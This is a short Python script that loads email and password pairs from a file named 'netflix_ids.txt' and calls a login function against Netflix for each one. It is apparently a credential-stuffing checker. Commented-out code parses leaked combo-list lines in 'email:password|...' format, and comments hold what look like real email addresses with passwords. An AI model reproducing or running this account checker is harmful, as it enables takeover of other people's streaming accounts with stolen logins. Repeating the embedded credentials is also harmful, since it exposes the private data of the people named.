from utils import read_credentials_from_file, try_login_netflix


file_path = 'netflix_ids.txt' #os.path.join(os.path.dirname(__file__), 'credentials')

# Extracting email addresses and passwords
credentials = read_credentials_from_file(file_path)

# with open(file_path, 'r') as file:
#         text = file.read()
# for line in text.split("\n"):
#     # Provided line

#     # Split the line based on "|"
#     fields = line.split("|")

#     # Extract email and password from the first field
#     email, password = fields[0].strip().split(":")

#     # Print or do something with email and password
#     print("Email:", email)
#     print("Password:", password)
    
#     with open('netflix_ids.txt', 'a') as file:
#         file.writelines(f"{email}:{password}")
#         file.write('\n')


print(credentials)
# Displaying extracted credentials
for cred in credentials:
    print(cred["email"], cred["password"])
    try_login_netflix(cred["email"], cred["password"])




# credentials = [
#     {'email':'samuray5996@yandex.ru', 'password':'Rainbowdasfsfh96@'},
#     {'email':'jam0857es@gmail.com', 'password':'James0857'}]




# email = 'samuray996@yandex.ru'
# password = 'Rainbowdash96@'
# try_login(email, password)
